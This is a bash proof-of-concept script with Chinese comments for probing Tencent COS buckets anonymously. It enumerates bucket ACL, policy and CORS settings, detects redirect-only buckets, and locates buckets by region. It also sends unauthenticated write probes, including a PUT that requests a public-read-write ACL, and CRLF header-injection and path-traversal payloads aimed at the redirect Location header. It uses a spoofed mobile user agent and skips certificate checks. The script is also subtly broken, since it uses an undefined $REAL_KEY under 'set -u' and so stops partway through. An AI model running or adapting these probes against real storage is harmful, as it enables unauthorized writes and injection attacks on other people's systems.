#!/usr/bin/env bash
# cos-probe.sh <bucket> [region|accelerate]
# 用途：判定 COS 桶是「有内容」还是「纯重定向器」，并收敛匿名写面。只读为主，写探测每条 1 次。
set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./poc.sh <bucket> [region|accelerate]\n' >&2; exit 1; fi
BUCKET="${1:?bucket}"
REGION="${2:-accelerate}"
H="https://${BUCKET}.cos.${REGION}.myqcloud.com"
UA='Mozilla/5.0 (Linux; Android 13; PGZ110; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Mobile Safari/537.36'

echo "== 1) 桶级子资源（区分 AccessDenied / NoSuchBucket）=="
for q in "" "?acl" "?policy" "?cors" "?tagging" "?versioning" "?location" "?prefix=&delimiter=/"; do
  printf '%-22s ' "$q"
  curl -s -k -m 12 -o /tmp/cb.xml -w '%{http_code} %{size_download}B ' -A "$UA" "$H/$q"
  grep -oE '<Code>[^<]+' /tmp/cb.xml | head -1
  echo
  sleep 0.3
done

echo "== 2) 万能重定向判定：真实 key vs 必然不存在的 key =="
for k in "$REAL_KEY" "zzz-not-exist-$$"; do
  printf '%-24s ' "/$k"
  curl -s -k -m 12 -D - -o /dev/null -A "$UA" "$H/$k" | grep -iE '^(HTTP/|location:)' | tr '\n' ' '
  echo
  sleep 0.3
done
echo "   ▲ 二者同状态同性质 ⇒ 桶级规则跳转，桶内无内容"

echo "== 3) 对象级佐证（存在则为 200，不存在为 404 NoSuchKey）=="
curl -s -k -m 12 -o /tmp/cb2.xml -w 'acl  -> %{http_code} ' -A "$UA" "$H/$REAL_KEY?acl"; grep -oE '<Code>[^<]+' /tmp/cb2.xml | head -1

echo "== 4) 写面四探针（各 1 次；出现 200/204 立即停手）=="
curl -s -k -m 12 -X POST -o /tmp/w1 -w '?uploads        -> %{http_code} ' -A "$UA" "$H/probe-write.bin?uploads"; grep -oE '<Code>[^<]+' /tmp/w1|head -1; sleep 1
curl -s -k -m 12 -X PUT --data-binary 'probe' -o /tmp/w2 -w 'PUT             -> %{http_code} ' -A "$UA" "$H/probe-write.bin"; grep -oE '<Code>[^<]+' /tmp/w2|head -1; sleep 1
curl -s -k -m 12 -X PUT --data-binary 'probe' -H 'x-cos-acl: public-read-write' -o /tmp/w3 -w 'PUT+x-cos-acl   -> %{http_code} ' -A "$UA" "$H/probe-acl.bin"; grep -oE '<Code>[^<]+' /tmp/w3|head -1; sleep 1
curl -s -k -m 12 -X POST -F 'file=@/dev/null;filename=probe.bin' -o /tmp/w4 -w 'form POST /     -> %{http_code} ' -A "$UA" "$H/"; grep -oE '<Code>[^<]+' /tmp/w4|head -1

echo "== 5) 区域定位（多区域跑本脚本，403/302=桶在此区域，404 NoSuchBucket=不在）=="
for r in ap-guangzhou ap-hongkong ap-shanghai ap-beijing ap-chengdu ap-singapore na-siliconvalley; do
  printf 'cos.%-18s ' "$r"
  curl -s -k -m 8 -o /tmp/rr -w '%{http_code} ' -A "$UA" "https://${BUCKET}.cos.${r}.myqcloud.com/x"
  grep -oE '<Code>[^<]+' /tmp/rr | head -1
  echo
  sleep 0.3
done

echo "== 6) Location 是否镜像输入（未过滤时可注入固定 CDN 的 query）=="
for k in 'q%3F%3F' 'q%23f' 'q%0d%0aX-Inj:%201' '%2e%2e/%2e%2e/x'; do
  printf '%-22s ' "/$k"
  curl -s -k -m 12 -D - -o /dev/null -A "$UA" "$H/$k" | grep -iE '^(HTTP/|location:)' | tr '\n' ' '
  echo
  sleep 0.4
done
